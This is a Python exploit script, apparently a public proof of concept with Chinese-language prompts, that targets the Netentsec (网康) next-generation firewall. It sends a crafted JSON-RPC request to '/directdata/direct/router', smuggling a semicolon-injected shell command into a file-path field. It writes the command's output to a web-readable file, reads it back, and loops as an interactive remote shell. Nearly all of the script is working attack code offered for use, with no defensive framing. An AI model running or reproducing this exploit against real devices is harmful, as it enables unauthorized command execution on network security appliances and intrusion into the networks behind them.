import requests
requests.packages.urllib3.disable_warnings()
import sys,colorama
from colorama import *
init(autoreset=True)

def title():
    print(colorama.Fore.GREEN + '+-------------------------------------------------------------+')
    print(colorama.Fore.GREEN + '+      网康下一代防火墙 命令执行 + RCE                +')
    print(colorama.Fore.GREEN + '+-------------------------------------------------------------+')
    print(colorama.Fore.GREEN + '+ EXP: python3 wangkang_下一代防火墙.py https://1.1.1.1:8443          +')
    print(colorama.Fore.GREEN + '+-------------------------------------------------------------+')
    print(colorama.Fore.GREEN + '+ 请输入url-格式为:https://xx.xx.xx.xx                           +')


def cmd(urls,cmds):
    url = urls + '/directdata/direct/router'
    data = {"action": "SSLVPN_Resource", "data": [{"data": ["/var/www/html/d.txt;%s >/var/www/html/111.txt" % cmds]}], "f8839p7rqtj": "=", "method": "deleteImage", "tid": 17, "type": "rpc"}
    cmdlist = requests.post(url=url,verify=False,json=data)
    cmdshow = urls + '/111.txt'
    response = requests.get(url=cmdshow,verify=False)
    if len(response.text) == 0:
        print(colorama.Fore.YELLOW + "未读取到信息，请检查命令是否输入正确")
    print('------------------------------执行结果----------------------------------\n')
    print(colorama.Fore.RED+'{}'.format(response.text))
    print(colorama.Fore.GREEN + '+ 输入下条需要执行的命令--退出输入Q：                           +')
    jhlist = input('输入:')
    if jhlist == 'Q':
        pass
    else:
        cmd(urls, jhlist)



if __name__ == '__main__':
    title()
    urls = input('你的url:')
    print(colorama.Fore.YELLOW + '------------------------------------------------------------------------\n')
    print(colorama.Fore.GREEN + '+ 输入需要执行的命令                          +')
    cmds = input('你的命令:')
    print(colorama.Fore.YELLOW + '------------------------------------------------------------------------\n')
    cmd(urls,cmds)